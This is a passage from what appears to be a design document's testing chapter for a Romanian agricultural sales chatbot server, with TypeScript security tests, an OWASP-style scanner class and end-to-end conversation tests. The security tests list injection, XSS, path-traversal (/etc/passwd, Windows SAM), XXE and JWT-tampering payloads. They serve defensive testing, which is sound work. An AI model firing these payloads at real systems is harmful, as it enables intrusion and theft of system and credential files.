          path: '/api/mcp/tools/execute',
          headers: { Authorization: `Bearer ${token}` },
          body: {
            name: 'shell_command',
            arguments: { command: payload }
          }
        });

        // Should reject dangerous commands
        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid');
      }
    });

    it('should prevent LDAP injection', async () => {
      const maliciousPayloads = [
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(&)"
      ];

      for (const payload of maliciousPayloads) {
        const response = await securityTester.makeRequest({
          method: 'POST',
          path: '/api/auth/login',
          body: {
            username: payload,
            password: 'test'
          }
        });

        expect([400, 401]).toContain(response.status);
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize HTML in user input', async () => {
      const token = await securityTester.getAuthToken('user1');
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<a href="javascript:alert(\'XSS\')">Click</a>'
      ];

      for (const payload of xssPayloads) {
        const response = await securityTester.makeRequest({
          method: 'POST',
          path: '/api/mcp/conversations/conv-123/messages',
          headers: { Authorization: `Bearer ${token}` },
          body: {
            role: 'user',
            content: payload
          }
        });

        expect(response.status).toBe(201);
        // Content should be sanitized
        expect(response.body.content).not.toContain('<script>');
        expect(response.body.content).not.toContain('javascript:');
        expect(response.body.content).not.toContain('onerror=');
      }
    });

    it('should set proper Content-Type headers', async () => {
      const token = await securityTester.getAuthToken('user1');

      const response = await securityTester.makeRequest({
        method: 'GET',
        path: '/api/mcp/conversations',
        headers: { Authorization: `Bearer ${token}` }
      });

      expect(response.headers['content-type']).toContain('application/json');
      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });
  });

  describe('CSRF Protection', () => {
    it('should require CSRF token for state-changing operations', async () => {
      const token = await securityTester.getAuthToken('user1');

      const response = await securityTester.makeRequest({
        method: 'POST',
        path: '/api/mcp/conversations',
        headers: { 
          Authorization: `Bearer ${token}`,
          // Omit CSRF token
        },
        body: { customerId: 'test' }
      });

      // Depending on implementation, might use SameSite cookies instead
      // This test verifies some CSRF protection exists
      expect([200, 201, 403]).toContain(response.status);
    });

    it('should validate Origin header', async () => {
      const token = await securityTester.getAuthToken('user1');

      const response = await securityTester.makeRequest({
        method: 'POST',
        path: '/api/mcp/conversations',
        headers: { 
          Authorization: `Bearer ${token}`,
          Origin: 'https://malicious-site.com'
        },
        body: { customerId: 'test' }
      });

      expect(response.status).toBe(403);
    });
  });

  describe('Rate Limiting', () => {
    it('should enforce rate limits', async () => {
      const token = await securityTester.getAuthToken('user1');
      const requests: Promise<any>[] = [];

      // Send 200 requests rapidly
      for (let i = 0; i < 200; i++) {
        requests.push(
          securityTester.makeRequest({
            method: 'GET',
            path: '/api/mcp/conversations',
            headers: { Authorization: `Bearer ${token}` }
          })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);

      expect(rateLimited.length).toBeGreaterThan(0);
      expect(rateLimited[0].headers['retry-after']).toBeDefined();
    });

    it('should have separate limits per endpoint', async () => {
      const token = await securityTester.getAuthToken('user1');

      // Hit rate limit on one endpoint
      for (let i = 0; i < 100; i++) {
        await securityTester.makeRequest({
          method: 'POST',
          path: '/api/mcp/tools/execute',
          headers: { Authorization: `Bearer ${token}` },
          body: { name: 'search_products', arguments: {} }
        });
      }

      // Other endpoint should still work
      const response = await securityTester.makeRequest({
        method: 'GET',
        path: '/api/mcp/sessions',
        headers: { Authorization: `Bearer ${token}` }
      });

      expect(response.status).toBe(200);
    });
  });

  describe('Path Traversal', () => {
    it('should prevent path traversal attacks', async () => {
      const token = await securityTester.getAuthToken('user1');
      const traversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc/passwd'
      ];

      for (const payload of traversalPayloads) {
        const response = await securityTester.makeRequest({
          method: 'GET',
          path: `/api/mcp/resources/file/${encodeURIComponent(payload)}`,
          headers: { Authorization: `Bearer ${token}` }
        });

        expect([400, 403, 404]).toContain(response.status);
        expect(response.body).not.toContain('root:');
      }
    });
  });

  describe('Sensitive Data Exposure', () => {
    it('should not expose stack traces in production', async () => {
      const response = await securityTester.makeRequest({
        method: 'POST',
        path: '/api/mcp/conversations',
        body: { invalid: 'data' }
      });

      expect(response.body.stack).toBeUndefined();
      expect(response.body.trace).toBeUndefined();
    });

    it('should mask sensitive fields in responses', async () => {
      const token = await securityTester.getAuthToken('admin');

      const response = await securityTester.makeRequest({
        method: 'GET',
        path: '/api/mcp/customers/cust-123',
        headers: { Authorization: `Bearer ${token}` }
      });

      if (response.body.phone) {
        expect(response.body.phone).toMatch(/\*{3,}/);
      }
      if (response.body.email) {
        expect(response.body.email).toMatch(/\*{2,}@/);
      }
    });

    it('should not expose internal IDs', async () => {
      const token = await securityTester.getAuthToken('user1');

      const response = await securityTester.makeRequest({
        method: 'GET',
        path: '/api/mcp/conversations',
        headers: { Authorization: `Bearer ${token}` }
      });

      for (const conv of response.body.data || []) {
        expect(conv._id).toBeUndefined();
        expect(conv.__v).toBeUndefined();
        expect(conv.internalId).toBeUndefined();
      }
    });
  });

  describe('Security Headers', () => {
    it('should set all required security headers', async () => {
      const response = await securityTester.makeRequest({
        method: 'GET',
        path: '/api/mcp/health'
      });

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toContain('max-age=');
      expect(response.headers['content-security-policy']).toBeDefined();
      expect(response.headers['referrer-policy']).toBeDefined();
    });

    it('should not expose server information', async () => {
      const response = await securityTester.makeRequest({
        method: 'GET',
        path: '/api/mcp/health'
      });

      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-powered-by']).toBeUndefined();
    });
  });
});
```

#### 10.5.2 Security Tester Implementation

```typescript
// tests/security/security-tester.ts

import jwt from 'jsonwebtoken';
import crypto from 'crypto';

interface RequestOptions {
  method: string;
  path: string;
  headers?: Record<string, string>;
  body?: any;
}

interface ResponseData {
  status: number;
  headers: Record<string, string>;
  body: any;
}

export class MCPSecurityTester {
  private baseUrl: string;
  private jwtSecret: string = 'test-secret-key';
  private tokens: Map<string, string> = new Map();

  constructor(baseUrl: string) {
    this.baseUrl = baseUrl;
  }

  async makeRequest(options: RequestOptions): Promise<ResponseData> {
    const url = `${this.baseUrl}${options.path}`;
    
    const fetchOptions: RequestInit = {
      method: options.method,
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      }
    };

    if (options.body) {
      fetchOptions.body = JSON.stringify(options.body);
    }

    const response = await fetch(url, fetchOptions);
    
    const headers: Record<string, string> = {};
    response.headers.forEach((value, key) => {
      headers[key.toLowerCase()] = value;
    });

    let body: any;
    try {
      body = await response.json();
    } catch {
      body = await response.text();
    }

    return {
      status: response.status,
      headers,
      body
    };
  }

  generateExpiredToken(): string {
    return jwt.sign(
      {
        sub: 'test-user',
        iat: Math.floor(Date.now() / 1000) - 7200, // 2 hours ago
        exp: Math.floor(Date.now() / 1000) - 3600  // Expired 1 hour ago
      },
      this.jwtSecret
    );
  }

  generateTamperedToken(): string {
    const validToken = jwt.sign(
      { sub: 'test-user' },
      this.jwtSecret
    );
    
    // Tamper with the payload
    const parts = validToken.split('.');
    const payload = JSON.parse(
      Buffer.from(parts[1], 'base64url').toString()
    );
    payload.sub = 'admin'; // Try to escalate privileges
    parts[1] = Buffer.from(JSON.stringify(payload)).toString('base64url');
    
    return parts.join('.');
  }

  async getAuthToken(role: string): Promise<string> {
    if (this.tokens.has(role)) {
      return this.tokens.get(role)!;
    }

    const token = jwt.sign(
      {
        sub: `user-${role}`,
        role,
        tenantId: role.includes('tenant') ? role : 'tenant1',
        permissions: this.getPermissionsForRole(role)
      },
      this.jwtSecret,
      { expiresIn: '1h' }
    );

    this.tokens.set(role, token);
    return token;
  }

  private getPermissionsForRole(role: string): string[] {
    const rolePermissions: Record<string, string[]> = {
      admin: ['*'],
      supervisor: ['read', 'write', 'delete', 'approve'],
      agent: ['read', 'write'],
      viewer: ['read'],
      user1: ['read', 'write']
    };
    return rolePermissions[role] || ['read'];
  }

  async runSecurityScan(): Promise<SecurityScanResult> {
    const results: SecurityScanResult = {
      passed: [],
      failed: [],
      warnings: [],
      score: 0
    };

    // OWASP Top 10 checks
    const checks = [
      this.checkInjection.bind(this),
      this.checkBrokenAuth.bind(this),
      this.checkSensitiveDataExposure.bind(this),
      this.checkXXE.bind(this),
      this.checkBrokenAccessControl.bind(this),
      this.checkSecurityMisconfiguration.bind(this),
      this.checkXSS.bind(this),
      this.checkInsecureDeserialization.bind(this),
      this.checkVulnerableComponents.bind(this),
      this.checkInsufficientLogging.bind(this)
    ];

    for (const check of checks) {
      const result = await check();
      if (result.passed) {
        results.passed.push(result);
      } else if (result.severity === 'warning') {
        results.warnings.push(result);
      } else {
        results.failed.push(result);
      }
    }

    results.score = Math.round(
      (results.passed.length / (results.passed.length + results.failed.length)) * 100
    );

    return results;
  }

  private async checkInjection(): Promise<SecurityCheckResult> {
    const injectionPayloads = [
      { type: 'sql', payload: "' OR '1'='1" },
      { type: 'nosql', payload: '{"$gt": ""}' },
      { type: 'command', payload: '; ls -la' }
    ];

    let vulnerabilities = 0;
    const details: string[] = [];

    for (const { type, payload } of injectionPayloads) {
      const response = await this.makeRequest({
        method: 'GET',
        path: `/api/mcp/search?q=${encodeURIComponent(payload)}`
      });

      // Check for signs of injection success
      if (response.status === 200 && response.body.length > 100) {
        vulnerabilities++;
        details.push(`Potential ${type} injection vulnerability`);
      }
    }

    return {
      name: 'A1: Injection',
      passed: vulnerabilities === 0,
      severity: vulnerabilities > 0 ? 'critical' : 'info',
      details
    };
  }

  private async checkBrokenAuth(): Promise<SecurityCheckResult> {
    const details: string[] = [];
    let issues = 0;

    // Check for weak session IDs
    const response1 = await this.makeRequest({
      method: 'POST',
      path: '/api/auth/login',
      body: { username: 'test', password: 'test' }
    });

    if (response1.body.sessionId && response1.body.sessionId.length < 32) {
      issues++;
      details.push('Session ID appears to be weak (< 32 chars)');
    }

    // Check for session fixation
    const oldToken = await this.getAuthToken('user1');
    await this.makeRequest({
      method: 'POST',
      path: '/api/auth/login',
      headers: { Authorization: `Bearer ${oldToken}` },
      body: { username: 'test', password: 'test' }
    });
    // Check if old token still works
    const response2 = await this.makeRequest({
      method: 'GET',
      path: '/api/mcp/sessions',
      headers: { Authorization: `Bearer ${oldToken}` }
    });

    if (response2.status === 200) {
      issues++;
      details.push('Possible session fixation vulnerability');
    }

    return {
      name: 'A2: Broken Authentication',
      passed: issues === 0,
      severity: issues > 0 ? 'critical' : 'info',
      details
    };
  }

  private async checkSensitiveDataExposure(): Promise<SecurityCheckResult> {
    const details: string[] = [];
    let issues = 0;

    const token = await this.getAuthToken('admin');
    
    const response = await this.makeRequest({
      method: 'GET',
      path: '/api/mcp/customers',
      headers: { Authorization: `Bearer ${token}` }
    });

    if (response.body.data) {
      for (const customer of response.body.data) {
        if (customer.password) {
          issues++;
          details.push('Password exposed in response');
        }
        if (customer.creditCard && !customer.creditCard.includes('*')) {
          issues++;
          details.push('Credit card not masked');
        }
      }
    }

    return {
      name: 'A3: Sensitive Data Exposure',
      passed: issues === 0,
      severity: issues > 0 ? 'high' : 'info',
      details
    };
  }

  private async checkXXE(): Promise<SecurityCheckResult> {
    const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>`;

    const response = await this.makeRequest({
      method: 'POST',
      path: '/api/mcp/import',
      headers: { 'Content-Type': 'application/xml' },
      body: xxePayload
    });

    const vulnerable = response.body.includes('root:') || 
                       response.body.includes('/bin/bash');

    return {
      name: 'A4: XML External Entities',
      passed: !vulnerable,
      severity: vulnerable ? 'critical' : 'info',
      details: vulnerable ? ['XXE vulnerability detected'] : []
    };
  }

  private async checkBrokenAccessControl(): Promise<SecurityCheckResult> {
    const details: string[] = [];
    let issues = 0;

    const viewerToken = await this.getAuthToken('viewer');

    // Try admin endpoint with viewer token
    const response = await this.makeRequest({
      method: 'GET',
      path: '/api/admin/users',
      headers: { Authorization: `Bearer ${viewerToken}` }
    });

    if (response.status === 200) {
      issues++;
      details.push('Admin endpoint accessible to viewer role');
    }

    // Try IDOR attack
    const response2 = await this.makeRequest({
      method: 'GET',
      path: '/api/mcp/conversations/other-user-conv-123',
      headers: { Authorization: `Bearer ${viewerToken}` }
    });

    if (response2.status === 200) {
      issues++;
      details.push('IDOR vulnerability: can access other user resources');
    }

    return {
      name: 'A5: Broken Access Control',
      passed: issues === 0,
      severity: issues > 0 ? 'critical' : 'info',
      details
    };
  }

  private async checkSecurityMisconfiguration(): Promise<SecurityCheckResult> {
    const details: string[] = [];
    let issues = 0;

    const response = await this.makeRequest({
      method: 'GET',
      path: '/api/mcp/health'
    });

    // Check for debug mode
    if (response.body.debug === true) {
      issues++;
      details.push('Debug mode enabled in production');
    }

    // Check for directory listing
    const response2 = await this.makeRequest({
      method: 'GET',
      path: '/static/'
    });

    if (response2.body.includes('Index of')) {
      issues++;
      details.push('Directory listing enabled');
    }

    // Check for default credentials
    const response3 = await this.makeRequest({
      method: 'POST',
      path: '/api/auth/login',
      body: { username: 'admin', password: 'admin' }
    });

    if (response3.status === 200) {
      issues++;
      details.push('Default admin credentials work');
    }

    return {
      name: 'A6: Security Misconfiguration',
      passed: issues === 0,
      severity: issues > 0 ? 'high' : 'info',
      details
    };
  }

  private async checkXSS(): Promise<SecurityCheckResult> {
    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(1)'
    ];

    const details: string[] = [];
    let vulnerable = false;

    const token = await this.getAuthToken('user1');

    for (const payload of xssPayloads) {
      const response = await this.makeRequest({
        method: 'POST',
        path: '/api/mcp/conversations/conv-123/messages',
        headers: { Authorization: `Bearer ${token}` },
        body: { content: payload }
      });

      if (response.body.content === payload) {
        vulnerable = true;
        details.push(`XSS payload not sanitized: ${payload.slice(0, 20)}...`);
      }
    }

    return {
      name: 'A7: Cross-Site Scripting',
      passed: !vulnerable,
      severity: vulnerable ? 'high' : 'info',
      details
    };
  }

  private async checkInsecureDeserialization(): Promise<SecurityCheckResult> {
    const maliciousPayload = {
      __proto__: { admin: true },
      constructor: { prototype: { admin: true } }
    };

    const token = await this.getAuthToken('user1');
    
    const response = await this.makeRequest({
      method: 'POST',
      path: '/api/mcp/conversations',
      headers: { Authorization: `Bearer ${token}` },
      body: maliciousPayload
    });

    // Check if prototype pollution worked
    const polluted = response.body.admin === true;

    return {
      name: 'A8: Insecure Deserialization',
      passed: !polluted,
      severity: polluted ? 'critical' : 'info',
      details: polluted ? ['Prototype pollution vulnerability'] : []
    };
  }

  private async checkVulnerableComponents(): Promise<SecurityCheckResult> {
    // This would normally check against vulnerability databases
    return {
      name: 'A9: Using Components with Known Vulnerabilities',
      passed: true,
      severity: 'info',
      details: ['Run npm audit for full scan']
    };
  }

  private async checkInsufficientLogging(): Promise<SecurityCheckResult> {
    const details: string[] = [];
    let issues = 0;

    // Trigger a security event
    await this.makeRequest({
      method: 'POST',
      path: '/api/auth/login',
      body: { username: 'admin', password: 'wrongpassword' }
    });

    // Check if it was logged (would need audit log access)
    // Simplified check for now
    
    return {
      name: 'A10: Insufficient Logging & Monitoring',
      passed: issues === 0,
      severity: issues > 0 ? 'medium' : 'info',
      details
    };
  }
}

interface SecurityCheckResult {
  name: string;
  passed: boolean;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info' | 'warning';
  details: string[];
}

interface SecurityScanResult {
  passed: SecurityCheckResult[];
  failed: SecurityCheckResult[];
  warnings: SecurityCheckResult[];
  score: number;
}

function calculateStdDev(values: number[]): number {
  const mean = values.reduce((a, b) => a + b) / values.length;
  const squareDiffs = values.map(v => Math.pow(v - mean, 2));
  return Math.sqrt(squareDiffs.reduce((a, b) => a + b) / values.length);
}
```

### 10.6 End-to-End Testing

End-to-end tests validate complete user workflows and system integration.

#### 10.6.1 E2E Test Framework

```typescript
// tests/e2e/mcp-e2e.test.ts

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { MCPTestEnvironment } from './test-environment';
import { ConversationSimulator } from './conversation-simulator';

describe('MCP Server E2E Tests', () => {
  let env: MCPTestEnvironment;
  let simulator: ConversationSimulator;

  beforeAll(async () => {
    env = new MCPTestEnvironment();
    await env.setup();
    simulator = new ConversationSimulator(env);
  });

  afterAll(async () => {
    await env.teardown();
  });

  describe('Complete Sales Conversation Flow', () => {
    it('should handle full product inquiry to order flow', async () => {
      const session = await env.createSession({
        userId: 'test-agent',
        tenantId: 'test-tenant'
      });

      const conversation = await env.createConversation({
        sessionId: session.id,
        customerId: 'RO12345678',
        channel: 'web_chat',
        context: {
          customerName: 'Ferma Agricolă SRL',
          customerType: 'farmer',
          region: 'Brăila'
        }
      });

      // Customer greeting
      const response1 = await simulator.sendMessage(
        conversation.id,
        'Bună ziua, aș dori informații despre semințe de grâu pentru sezonul următor.'
      );
      
      expect(response1.message.role).toBe('assistant');
      expect(response1.message.content).toContain('grâu');
      expect(response1.toolsUsed).toContain('search_products');

      // Product inquiry
      const response2 = await simulator.sendMessage(
        conversation.id,
        'Ce soiuri aveți disponibile pentru zona de sud-est?'
      );

      expect(response2.message.content).toMatch(/soi|varietate/i);
      expect(response2.resources).toBeDefined();
      expect(response2.resources.length).toBeGreaterThan(0);

      // Price inquiry
      const response3 = await simulator.sendMessage(
        conversation.id,
        'Care sunt prețurile pentru o comandă de 500 kg?'
      );

      expect(response3.toolsUsed).toContain('get_pricing');
      expect(response3.message.content).toMatch(/preț|lei|€/i);

      // Availability check
      const response4 = await simulator.sendMessage(
        conversation.id,
        'Puteți livra până la 1 martie?'
      );

      expect(response4.toolsUsed).toContain('check_stock');
      expect(response4.message.content).toMatch(/disponibil|livrare|stoc/i);

      // Order intent
      const response5 = await simulator.sendMessage(
        conversation.id,
        'Aș dori să plasez o comandă.'
      );

      expect(response5.intent).toBe('purchase');
      expect(response5.conversationState).toBe('negotiating');

      // Confirm order
      const response6 = await simulator.sendMessage(
        conversation.id,
        'Da, confirmați comanda de 500 kg semințe de grâu la prețul discutat.'
      );

      expect(response6.toolsUsed).toContain('create_order');
      expect(response6.orderCreated).toBe(true);
      expect(response6.conversationState).toBe('completed');

      // Verify conversation history
      const history = await env.getConversationHistory(conversation.id);
      expect(history.messages.length).toBe(12); // 6 pairs
      expect(history.outcome).toBe('order_placed');

      // Cleanup
      await env.endSession(session.id);
    });

    it('should handle objection handling and negotiation', async () => {
      const { session, conversation } = await env.createTestConversation();

      // Initial inquiry
      await simulator.sendMessage(
        conversation.id,
        'Vreau să comand fertilizant pentru 100 hectare.'
      );

      // Price objection
      const response1 = await simulator.sendMessage(
        conversation.id,
        'Prețul mi se pare prea mare. Am văzut altundeva cu 20% mai ieftin.'
      );

      expect(response1.sentiment).toBe('negative');
      expect(response1.objectionDetected).toBe(true);
      expect(response1.message.content).toMatch(/înțeleg|appreciate/i);
      expect(response1.toolsUsed).toContain('check_discount_eligibility');

      // Competitor mention
      const response2 = await simulator.sendMessage(
        conversation.id,
        'AgroChim mi-a oferit un preț mai bun.'
      );

      expect(response2.competitorMentioned).toBe(true);
      expect(response2.conversationState).toBe('negotiating');

      // Offer discount
      const response3 = await simulator.sendMessage(
        conversation.id,
        'Ce discount puteți oferi pentru o comandă fermă?'
      );

      expect(response3.toolsUsed).toContain('get_pricing');
      expect(response3.discountOffered).toBeDefined();
      expect(response3.discountOffered.percentage).toBeGreaterThan(0);

      // Accept negotiated price
      const response4 = await simulator.sendMessage(
        conversation.id,
        'Accept la acest preț. Faceți comanda.'
      );

      expect(response4.conversationState).toBe('completed');
      expect(response4.negotiationOutcome).toBe('accepted');
    });

    it('should handle handover to human agent', async () => {
      const { session, conversation } = await env.createTestConversation();

      // Escalation request
      const response = await simulator.sendMessage(
        conversation.id,
        'Vreau să vorbesc cu un reprezentant uman, am o situație complicată.'
      );

      expect(response.intent).toBe('human_handover');
      expect(response.handoverInitiated).toBe(true);
      expect(response.toolsUsed).toContain('initiate_handover');
      expect(response.conversationState).toBe('pending_handover');

      // Verify handover queue
      const handoverStatus = await env.getHandoverStatus(conversation.id);
      expect(handoverStatus.queued).toBe(true);
      expect(handoverStatus.priority).toBeDefined();
      expect(handoverStatus.estimatedWaitTime).toBeDefined();

      // Simulate human agent pickup
      await env.simulateAgentPickup(conversation.id, 'agent-001');

      const response2 = await simulator.sendMessage(
        conversation.id,
        'Bună, cum vă pot ajuta?',
        { role: 'agent' }
      );

      expect(response2.conversationState).toBe('human_active');
      expect(response2.handoverCompleted).toBe(true);
    });

    it('should maintain context across session reconnection', async () => {
      const session = await env.createSession({
        userId: 'test-agent',
        tenantId: 'test-tenant'
      });

      const conversation = await env.createConversation({
        sessionId: session.id,
        customerId: 'RO12345678',
        channel: 'web_chat'
      });

      // Initial interaction
      await simulator.sendMessage(
        conversation.id,
        'Mă interesează tractoare pentru ferma mea de 200 hectare.'
      );

      // Store session state
      const sessionState = await env.getSessionState(session.id);

      // Simulate disconnection
      await env.disconnectSession(session.id);

      // Reconnect with new session
      const newSession = await env.createSession({
        userId: 'test-agent',
        tenantId: 'test-tenant',
        previousSessionId: session.id
      });

      // Resume conversation
      const response = await simulator.sendMessage(
        conversation.id,
        'Am revenit. Mai avem de discutat despre tractoare.',
        { sessionId: newSession.id }
      );

      expect(response.contextRestored).toBe(true);
      expect(response.previousContext.interest).toBe('tractoare');
      expect(response.previousContext.farmSize).toBe(200);
    });
  });

  describe('Multi-Channel Conversation', () => {
    it('should sync conversation across channels', async () => {
      const { session, conversation } = await env.createTestConversation({
        channel: 'web_chat'
      });

      // Start on web chat
      await simulator.sendMessage(
        conversation.id,
        'Vreau să comand pesticide pentru roșii.'
      );

      // Continue on WhatsApp
      const waResponse = await simulator.sendMessage(
        conversation.id,
        'Am primit mesajul pe WhatsApp. Vreau să continui conversația.',
        { channel: 'whatsapp' }
      );

      expect(waResponse.contextRestored).toBe(true);
      expect(waResponse.previousChannel).toBe('web_chat');

      // Verify unified history
      const history = await env.getConversationHistory(conversation.id);
      expect(history.channels).toContain('web_chat');
      expect(history.channels).toContain('whatsapp');
    });
  });

  describe('Error Recovery', () => {
    it('should gracefully handle API failures', async () => {
      const { session, conversation } = await env.createTestConversation();

      // Simulate external API failure
      await env.mockExternalApi('anaf', { status: 503 });

      const response = await simulator.sendMessage(
        conversation.id,
        'Verificați compania cu CUI 12345678'
      );

      expect(response.error).toBeUndefined();
      expect(response.message.content).toMatch(/momentan|încercați|ulterior/i);
      expect(response.fallbackUsed).toBe(true);

      // Restore API
      await env.mockExternalApi('anaf', { status: 200 });
    });

    it('should recover from LLM timeout', async () => {
      const { session, conversation } = await env.createTestConversation();

      // Simulate LLM timeout
      await env.mockLLM({ timeout: true });

      const response = await simulator.sendMessage(
        conversation.id,
        'Ce recomandări aveți pentru cultura de porumb?'
      );

      expect(response.fallbackResponse).toBe(true);
      expect(response.message.content).toBeDefined();

      // Restore LLM
      await env.mockLLM({ timeout: false });
    });

    it('should maintain data integrity during failures', async () => {
      const { session, conversation } = await env.createTestConversation();

      // Start order process
      await simulator.sendMessage(
        conversation.id,
        'Plasează o comandă de 1000 kg fertilizant NPK.'
      );

      // Simulate database failure during order creation
      await env.simulateDatabaseFailure('orders');

      const response = await simulator.sendMessage(
        conversation.id,
        'Confirmă comanda.'
      );

      expect(response.error).toBeDefined();
      expect(response.message.content).toMatch(/problemă|încercați/i);

      // Verify no partial order was created
      const orders = await env.getOrders(conversation.customerId);
      const pendingOrders = orders.filter(o => o.status === 'pending');
      expect(pendingOrders.length).toBe(0);

      // Restore database
      await env.restoreDatabase('orders');
    });
  });

  describe('Concurrent Conversations', () => {
    it('should handle multiple concurrent conversations', async () => {
      const sessions = await Promise.all(
        Array(10).fill(null).map((_, i) => 
          env.createSession({
            userId: `agent-${i}`,
            tenantId: 'test-tenant'
          })
        )
      );

      const conversations = await Promise.all(
        sessions.map(session =>
          env.createConversation({
            sessionId: session.id,
            customerId: `RO${12345678 + session.id}`,
            channel: 'web_chat'
          })
        )
      );

      // Send messages concurrently
      const responses = await Promise.all(
        conversations.map(conv =>
          simulator.sendMessage(
            conv.id,
            'Ce produse aveți disponibile?'
          )
        )
      );

      // All should succeed
      expect(responses.every(r => r.message.role === 'assistant')).toBe(true);

      // Each should have unique responses
      const contents = responses.map(r => r.message.content);
      const uniqueContents = new Set(contents);
      // Some variation expected
      expect(uniqueContents.size).toBeGreaterThan(5);
    });

    it('should isolate tenant data in concurrent operations', async () => {
      const tenant1Session = await env.createSession({
        userId: 'agent-1',
        tenantId: 'tenant-1'
      });

      const tenant2Session = await env.createSession({
        userId: 'agent-2',
        tenantId: 'tenant-2'
      });

      const conv1 = await env.createConversation({
        sessionId: tenant1Session.id,
        customerId: 'RO12345678',
        channel: 'web_chat'
      });

      const conv2 = await env.createConversation({
        sessionId: tenant2Session.id,
        customerId: 'RO87654321',
        channel: 'web_chat'
      });

      // Both tenants query products
      const [response1, response2] = await Promise.all([
        simulator.sendMessage(conv1.id, 'Show me all products'),
        simulator.sendMessage(conv2.id, 'Show me all products')
      ]);

      // Verify data isolation
      const products1 = response1.resources.filter(r => r.type === 'product');
      const products2 = response2.resources.filter(r => r.type === 'product');

      // Products should be tenant-specific
      expect(products1.every(p => p.tenantId === 'tenant-1')).toBe(true);
      expect(products2.every(p => p.tenantId === 'tenant-2')).toBe(true);
    });
  });

  describe('Performance Under Load', () => {
    it('should maintain response times under load', async () => {
      const sessions = await Promise.all(
        Array(50).fill(null).map((_, i) =>
          env.createSession({
            userId: `load-agent-${i}`,
            tenantId: 'test-tenant'
          })
        )
      );

      const conversations = await Promise.all(
        sessions.map(session =>
          env.createConversation({
            sessionId: session.id,
            customerId: `RO${10000000 + sessions.indexOf(session)}`,
            channel: 'web_chat'
          })
        )
      );

      const startTime = Date.now();

      const responses = await Promise.all(
        conversations.map(conv =>
          simulator.sendMessageWithTiming(
            conv.id,
            'Quick product search: tractoare'
          )
        )
      );

      const totalTime = Date.now() - startTime;
      const avgResponseTime = totalTime / responses.length;
      const p95ResponseTime = getPercentile(
        responses.map(r => r.timing.total),
        95
      );

      expect(avgResponseTime).toBeLessThan(2000); // < 2s average
      expect(p95ResponseTime).toBeLessThan(5000); // < 5s p95
    });
  });
});

function getPercentile(values: number[], percentile: number): number {
  const sorted = [...values].sort((a, b) => a - b);
  const index = Math.ceil((percentile / 100) * sorted.length) - 1;
  return sorted[index];
}
```

#### 10.6.2 Test Environment Setup

```typescript
// tests/e2e/test-environment.ts

import { GenericContainer, StartedTestContainer } from 'testcontainers';
import { Pool } from 'pg';
import Redis from 'ioredis';
import { MCPClient } from '../../src/client/mcp-client';

export interface TestSession {
  id: string;
  userId: string;
  tenantId: string;
  token: string;
}

export interface TestConversation {
  id: string;
  sessionId: string;
  customerId: string;
  channel: string;
}

export class MCPTestEnvironment {
  private pgContainer!: StartedTestContainer;
  private redisContainer!: StartedTestContainer;
  private mcpContainer!: StartedTestContainer;
  
  private pgPool!: Pool;
  private redis!: Redis;
  private client!: MCPClient;

  private mocks: Map<string, any> = new Map();

  async setup(): Promise<void> {
    console.log('Setting up test environment...');

    // Start PostgreSQL
    this.pgContainer = await new GenericContainer('postgres:16')
      .withEnvironment({
        POSTGRES_DB: 'mcp_test',
        POSTGRES_USER: 'test',
        POSTGRES_PASSWORD: 'test'
      })
      .withExposedPorts(5432)
      .start();

    const pgPort = this.pgContainer.getMappedPort(5432);

    this.pgPool = new Pool({
      host: 'localhost',
      port: pgPort,
      database: 'mcp_test',
      user: 'test',
      password: 'test'
    });

    // Run migrations
    await this.runMigrations();

    // Start Redis
    this.redisContainer = await new GenericContainer('redis:7')
      .withExposedPorts(6379)
      .start();

    const redisPort = this.redisContainer.getMappedPort(6379);
    this.redis = new Redis({
      host: 'localhost',
      port: redisPort
    });

    // Start MCP Server
    this.mcpContainer = await new GenericContainer('cerniq-mcp-server:test')
      .withEnvironment({
        DATABASE_URL: `postgresql://test:test@host.docker.internal:${pgPort}/mcp_test`,
        REDIS_URL: `redis://host.docker.internal:${redisPort}`,
        NODE_ENV: 'test',
        LOG_LEVEL: 'warn'
      })
      .withExposedPorts(3000)
      .start();

    const mcpPort = this.mcpContainer.getMappedPort(3000);

    // Initialize client
    this.client = new MCPClient({
      baseUrl: `http://localhost:${mcpPort}`,
      timeout: 30000
    });

    // Wait for server to be ready
    await this.waitForReady();

    // Seed test data
    await this.seedTestData();

    console.log('Test environment ready');
  }

  async teardown(): Promise<void> {
    console.log('Tearing down test environment...');

    await this.client?.close();
    await this.redis?.quit();
    await this.pgPool?.end();
    await this.mcpContainer?.stop();
    await this.redisContainer?.stop();
    await this.pgContainer?.stop();

    console.log('Test environment torn down');
  }

  private async runMigrations(): Promise<void> {
    const migrations = [
      `CREATE TABLE IF NOT EXISTS sessions (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        user_id VARCHAR(255) NOT NULL,
        tenant_id VARCHAR(255) NOT NULL,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        expires_at TIMESTAMPTZ,
        metadata JSONB DEFAULT '{}'
      )`,
      `CREATE TABLE IF NOT EXISTS conversations (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        session_id UUID REFERENCES sessions(id),
        customer_id VARCHAR(50),
        channel VARCHAR(50) NOT NULL,
        status VARCHAR(50) DEFAULT 'active',
        context JSONB DEFAULT '{}',
